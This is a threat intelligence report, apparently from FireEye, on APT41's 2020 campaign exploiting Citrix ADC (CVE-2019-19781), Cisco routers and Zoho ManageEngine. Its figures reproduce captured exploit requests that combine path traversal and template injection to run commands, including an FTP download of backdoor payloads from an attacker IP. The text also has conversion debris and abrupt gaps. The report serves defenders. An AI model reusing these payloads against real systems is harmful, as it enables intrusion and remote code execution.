Between January 20 and March 11, FireEye observed APT41 attempt](https://www.fireeye.com/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html)\n[to exploit vulnerabilities in Citrix NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central at over 75](https://nvd.nist.gov/vuln/detail/CVE-2019-19781)\nFireEye customers. Countries we’ve seen targeted include Australia, Canada, Denmark, Finland, France, India, Italy,\nJapan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK and USA.\nThe following industries were targeted: Banking/Finance, Construction, Defense Industrial Base, Government,\nHealthcare, High Technology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil & Gas, Petrochemical,\nPharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and Utility. It’s unclear if APT41 scanned the\nInternet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims\nappear to be more targeted in nature.\n\n**Exploitation of CVE-2019-19781 (Citrix Application Delivery Controller [ADC])**\n\nStarting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits of Citrix Application Delivery\n[Controller (ADC) and Citrix Gateway devices with CVE-2019-19781 (published December 17, 2019).](https://support.citrix.com/article/CTX267027)\n\nFigure 1: Timeline of key events\n\nThe initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the command\n‘file /bin/pwd’, which may have achieved two objectives for APT41. First, it would confirm whether the system was\n[vulnerable and the mitigation wasn’t applied. Second, it may return architecture-related information that would be required](https://support.citrix.com/article/CTX267679)\nknowledge for APT41 to successfully deploy a backdoor in a follow-up step.\n\nOne interesting thing to note is that all observed requests were only performed against Citrix devices, suggesting APT41\nwas operating with an already-known list of identified devices accessible on the internet.\n\n\n-----\n\nPOST /vpns/portal/scripts/newbm.pl HTTP/1.1\n\nHost: [redacted]\n\nConnection: close\n\nAccept-Encoding: gzip, deflate\n\nAccept: */*\n\nUser-Agent: python-requests/2.22.0\n\nNSC_NONCE: nsroot\n\nNSC_USER: ../../../netscaler/portal/templates/[redacted]\n\nContent-Length: 96\n\nurl=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `file /bin/pwd`') %]\n\nFigure 2: Example APT41 HTTP traffic exploiting CVE-2019-19781\n\nThere is a lull in APT41 activity between January 23 and February 1, which is likely related to the Chinese Lunar New\nYear holidays which occurred between January 24 and January 30, 2020. This has been a common activity pattern by\nChinese APT groups in past years as well.\n\nStarting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that initiate a download via the\nFile Transfer Protocol (FTP). Specifically, APT41 executed the command ‘/usr/bin/ftp -o /tmp/bsd ftp://test:\n\n[redacted]\\@66.42.98[.]220/bsd’, which connected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server\nwith a username of ‘test’ and a password that we have redacted, and then downloaded an unknown payload named ‘bsd’\n(which was likely a backdoor).\n\nPOST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1\n\nAccept-Encoding: identity\n\nContent-Length: 147\n\nConnection: close\n\nNsc_User: ../../../netscaler/portal/templates/[redacted]\n\nUser-Agent: Python-urllib/2.7\n\nNsc_Nonce: nsroot\n\nHost: [redacted]\n\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/bsd ftp://test:\n\n**[redacted]\\@66.42.98[.]220/bsd`') %]**\n\nFigure 3: Example APT41 HTTP traffic exploiting CVE-2019-19781\n\nWe did not observe APT41 activity at FireEye customers between February 2 and February 19, 2020. China initiated\nCOVID-19 related quarantines in cities in Hubei province starting on January 23 and January 24, and rolled out\nquarantines to additional provinces starting between February 2 and February 10. While it is possible that this reduction in\nactivity might be related to the COVID-19 quarantine measures in China, APT41 may have remained active in other ways,\nwhich we were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-2019-19781\nexploitation on February 24 and February 25. The exploit behavior was almost identical to the activity on February 1,\nwhere only the name of the payload ‘un’ changed.\n\n\n-----\n\nPOST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1\n\nAccept-Encoding: identity\n\nContent-Length: 145\n\nConnection: close\n\nNsc_User: ../../../netscaler/portal/templates/[redacted]\n\nUser-Agent: Python-urllib/2.7\n\nNsc_Nonce: nsroot\n\nHost: [redacted]\n\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://example.com&title= [redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/un ftp://test:\n\n**[redacted]\\@66.42.98[.]220/un`') %]**\n\nFigure 4: Example APT41 HTTP traffic exploiting CVE-2019-19781\n\n[Citrix released a mitigation for CVE-2019-19781 on December 17, 2019, and as of January 24, 2020, released permanent](https://support.citrix.com/article/CTX267027)\nfixes for all supported versions of Citrix ADC, Gateway, and SD-WAN WANOP.\n\n**Cisco Router Exploitation**\n\nOn February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and\ndownloaded a 32-bit ELF binary payload compiled for a 64-bit MIPS processor named ‘fuc’ (MD5:\n155e98e5ca8d662fad7dc84187340cbc).

Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho\n\n\n-----\n\nManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five\nseparate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were\ndeployed.

While these backdoors are full featured, in previous incidents APT41 has waited to deploy more\nadvanced malware until they have fully understood where they were and carried out some initial reconnaissance. In 2020,\nAPT41 continues to be one of the most prolific threats that FireEye currently tracks. This new activity from this group\nshows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage.\n\n[Previously, FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-2019-3396 (Atlassian](https://www.fireeye.com/mandiant/managed-detection-and-response.html)\n[Confluence) against a U.S. based university.
